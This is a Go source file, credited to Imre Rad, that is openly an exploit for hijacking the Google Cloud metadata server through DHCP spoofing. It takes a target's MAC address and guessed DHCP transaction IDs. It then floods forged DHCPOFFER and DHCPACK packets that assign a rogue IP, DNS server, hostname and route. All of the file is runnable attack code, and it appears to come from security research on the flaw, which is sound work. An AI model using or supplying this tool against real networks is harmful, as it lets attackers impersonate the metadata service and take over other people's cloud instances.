package main

// GCP metadata server hijack via DHCP spoofing
// Exploit by Imre Rad (inspired by Chris Moberly)

import (
    "encoding/hex"
    "os"
    "io/ioutil"
    "flag"
    "fmt"
    "net"
    "strings"
    "time"

    "github.com/initstring/dhcp4"
//    reuse "github.com/libp2p/go-reuseport" // need a third party lib for this; seems like I'm on a hype train
)


var BROADCAST string = "255.255.255.255"
var METAIP string = "169.254.169.254"

var SOURCEPORT int = 67 // 0 // need to use a random port (to avoid port already in use issues)
var DESTPORT int = 68



func reverse(numbers []byte) []byte {
 for i := 0; i < len(numbers)/2; i++ {
  j := len(numbers) - i - 1
  numbers[i], numbers[j] = numbers[j], numbers[i]
 }
 return numbers
}

func main() {
    oneshotFlag := flag.Bool("oneshot", false, "Whether to flood infinitely or just to send a single round only. Defaults to false.")
    offerFlag := flag.Bool("offer", false, "Whether to send OFFER. Defaults to false (don't send).")
    ackFlag := flag.Bool("ack", false, "Whether to send ACK. Defaults to false (don't send).")
    xidStrFlag := flag.String("xids", "", "Required. DHCP transaction IDs to use as a comma separated list of raw hex (e.g. 12345678,DEADBEAF).")
    xidFileFlag := flag.String("xidfile", "", "Same as above xids, but this is a path to a text file.")
    leaseFlag := flag.Int("lease", 0, "Required. Lease time in seconds.")
    srcIPFlag := flag.String("srcip", "", "Required. The source IP address in the DHCP packets (IP header).")
    dstIPFlag := flag.String("dstip", "", "Required. The destination IP address in the DHCP packets (IP header).")
    newIPFlag := flag.String("newip", "", "Required. The new_address in DHCPACK (e.g. the rouge metadata server while poisoning).")
    newHostFlag := flag.String("newhost", "", "The new_hostname in DHCPACK (e.g. the rouge metadata server while poisoning).")
    routeFlag := flag.String("route", "", "The default route in DHCPACK. No route will be included if this parameter is omitted.")
    deviceFlag := flag.String("dev", "", "Required. Network device to use.")
    macFlag := flag.String("mac", "", "Required. MAC address of the target (e.g. 02:42:ac:11:00:04).")
    flag.Parse()

    xidInput := *xidStrFlag
    if (xidInput == "") {
       xidInput = os.Getenv("XIDS")
    }
    if ((xidInput == "") && (*xidFileFlag != "")) {
       xidBytes, err := ioutil.ReadFile(*xidFileFlag)
       if err != nil {
          panic(err)
       }
       xidInput = strings.TrimSpace(string(xidBytes))
    }
    if ((xidInput == "") || (*newIPFlag == "") || (*leaseFlag == 0) || (*macFlag == "")) {
        flag.PrintDefaults()
        return
    }

    var packetTypes = []dhcp4.MessageType {}
    if (*ackFlag) {
        packetTypes = append(packetTypes, dhcp4.ACK)
    }
    if (*offerFlag) {
        packetTypes = append(packetTypes, dhcp4.Offer)
    }

    if (len(packetTypes) <= 0) {
        fmt.Println("You need to specify either -ack or -offer (or both).")
        return
    }

    xidStrs := strings.Split(xidInput, ",")
    var xids [][]byte
    for _, x := range xidStrs {
        decoded, err := hex.DecodeString(x)
        if err != nil {
           panic(err)
        }
        xids = append(xids, reverse(decoded))
    }

    mac, _ := net.ParseMAC(*macFlag)

    fmt.Println("MAC:", *macFlag)
    fmt.Println("Src IP:", *srcIPFlag)
    fmt.Println("Dst IP:", *dstIPFlag)
    fmt.Println("New IP:", *newIPFlag)
    fmt.Println("New hostname:", *newHostFlag)
    fmt.Println("New route:", *routeFlag)
    fmt.Println("ACK:", *ackFlag)
    fmt.Println("Offer:", *offerFlag)
    fmt.Println("Oneshot:", *oneshotFlag)
    fmt.Println("Number of XIDs:", len(xids))

    flood(packetTypes, *oneshotFlag, *offerFlag, xids, parseIPv4(*srcIPFlag), parseIPv4(*dstIPFlag), parseIPv4(*newIPFlag), parseIPv4(*routeFlag), mac, *deviceFlag, *newHostFlag, *leaseFlag)
}

func getPacketName(packetType dhcp4.MessageType) string {
  if packetType == dhcp4.ACK {
     return "DHCPACK"
  } else if packetType == dhcp4.Offer {
     return "DHCPOFFER"
  } else {
     return "?"
  }
}

func parseIPv4(ip string) net.IP {
  if len(ip) <= 0 {
     return nil
  }
  return net.ParseIP(ip)[12:16]
}

func flood(
  packetTypes []dhcp4.MessageType,
  oneshot bool, 
  offer bool, 
  xids [][]byte, 
  srcIP net.IP, 
  dstIP net.IP, 
  newIP net.IP, 
  router net.IP, 
  mac net.HardwareAddr, 
  device string, 
  host string, 
  lease int) {
    // Transform the arguments into something usable
    dhcpServer := newIP
    dnsServer := net.ParseIP(METAIP)[12:16]
    hostName := []byte(host)
    leaseTime := time.Duration(lease) * time.Second

    // Set up the configuration for the DHCP packets
    type config struct {
        description   string
        mt            dhcp4.MessageType
        chAddr        net.HardwareAddr
        CIAddr        net.IP
        serverId      net.IP
        yIAddr        net.IP
        leaseDuration time.Duration
        xId           []byte
        broadcast     bool
        options       []dhcp4.Option
    }

    // Configure options for the "request packet" which is actually only
    // used to feed the function that creates the "reply packet"
    var reqOptions = []dhcp4.Option{
        dhcp4.Option{
            Code:  dhcp4.OptionRequestedIPAddress,
            Value: newIP,
        },
    }


    // Configure options for the "reply packet" (ACK), where the magic
    // really happens.
    var ackOptions []dhcp4.Option
    ackOptions = []dhcp4.Option{

        dhcp4.Option{
            Code:  dhcp4.OptionSubnetMask,
            Value: []byte{255, 255, 255, 255},
        },
        dhcp4.Option{
            Code:  dhcp4.OptionDomainNameServer,
            Value: dnsServer,
        },
    }

    if router != nil {
        ackOptions = append(ackOptions, dhcp4.Option{
            Code:  dhcp4.OptionRouter,
            Value: router,
        })
    }
    if len(hostName) > 0 {
        ackOptions = append(ackOptions, dhcp4.Option{
            Code:  dhcp4.OptionHostName,
            Value: hostName})
    }


    var replyPackets = []dhcp4.Packet {}

    for _, packetType := range packetTypes {

    var replyC = config{
        description:   getPacketName(packetType),
        mt:            packetType,
        chAddr:        mac,
        serverId:      dhcpServer,
        yIAddr:        newIP,
        leaseDuration: leaseTime,
        options:       ackOptions,
    }



    for _, xid := range xids {

       var reqC = config{
          description: "DHCP REQUEST",
          mt:          dhcp4.Request,
          chAddr:      mac,
          serverId:    []byte{169, 254, 169, 254},
          yIAddr:      []byte(net.ParseIP(BROADCAST))[12:16],
          CIAddr:      newIP,
          xId:         xid,
          options:     reqOptions,
       }

       // Build the actual reply packet that will be sent. We build a fake
       // request packet to feed into that function. It's how the library
       // works. Due to weird inconsistencies in xid behaviour, we want to flood
       // two types - little endian and big endian
       reqPacket1 := dhcp4.RequestPacket(reqC.mt, reqC.chAddr, reqC.CIAddr,
        reqC.xId, reqC.broadcast, reqC.options)
       replyPacket1 := dhcp4.ReplyPacket(reqPacket1, replyC.mt, replyC.serverId,
        replyC.yIAddr, replyC.leaseDuration, replyC.options)

       replyPackets = append(replyPackets, replyPacket1)
    }
    }

    // end of preparation, start flooding


    /*
    */
    src := net.UDPAddr{IP: srcIP, Port: SOURCEPORT}
    dest := net.UDPAddr{IP: dstIP, Port: DESTPORT}
    conn, err := net.DialUDP("udp", &src, &dest)
    // conn, err := reuse.Dial("udp", ipPort(srcIP, SOURCEPORT), ipPort(dstIP, DESTPORT))
    if err != nil {
        fmt.Println("UDP net.Dial error!\n%s", err)
        return
    }

    for {
        for _, packet := range replyPackets {
            conn.Write(packet)
        }
        if(oneshot) {
          return
        }
    }
}

func ipPort(ip net.IP, port int) string {
   return fmt.Sprintf("%s:%d", ip.String(), port)
}
